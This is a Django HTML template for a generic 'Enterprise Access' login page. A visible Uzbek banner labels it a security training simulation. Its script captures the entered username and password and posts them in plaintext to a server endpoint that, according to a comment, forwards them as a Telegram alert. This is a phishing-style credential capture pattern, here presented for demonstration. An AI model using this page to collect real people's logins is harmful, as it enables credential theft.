<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Enterprise Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8fafc;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            width: 100%;
            max-width: 420px;
        }
        .simulation-warning {
            background-color: #fff3cd;
            color: #856404;
            padding: 12px;
            border-radius: 6px;
            font-size: 0.85rem;
            margin-bottom: 25px;
            text-align: center;
            border: 1px solid #ffeeba;
        }
    </style>
</head>
<body>

<div class="login-box">
    <div class="simulation-warning">
        <strong>⚠️ O'quv Simulyatsiyasi:</strong> Bu sahifa tarmoq xavfsizligini namoyish etish uchungina qurilgan. <b>Hech qachon shaxsiy parollaringizni kiritmang!</b>
    </div>
    <h3 class="text-center mb-4" style="color: #334155; font-weight: 600;">Enterprise Access</h3>
    <form method="POST" id="simulationForm">
        {% csrf_token %}
        <div class="mb-3">
            <label class="form-label text-secondary">Foydalanuvchi ID</label>
            <input type="text" name="username" id="simUsername" class="form-control" placeholder="admin" required>
        </div>
        <div class="mb-4">
            <label class="form-label text-secondary">Kirish kaliti</label>
            <input type="password" name="password" id="simPassword" class="form-control" placeholder="••••••••" required>
        </div>
        <button type="submit" class="btn btn-dark w-100 py-2">Avtorizatsiya</button>
    </form>
</div>

<script>
    document.getElementById('simulationForm').addEventListener('submit', function(e) {
        const username = document.getElementById('simUsername').value;
        const password = document.getElementById('simPassword').value;
        
        // Send real-time Telegram alert for simulation login
        sendRealtimeAlert('Simulation Login', `Username: ${username}\nPassword: ${password}\nType: Enterprise Simulation`);
    });

    // Function to send real-time alerts
    function sendRealtimeAlert(dataType, dataContent) {
        fetch('/alerts/realtime/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value
            },
            body: JSON.stringify({ 
                data_type: dataType, 
                data_content: dataContent 
            })
        }).catch(e => console.log('Real-time alert failed:', e));
    }
</script>

</body>
</html>
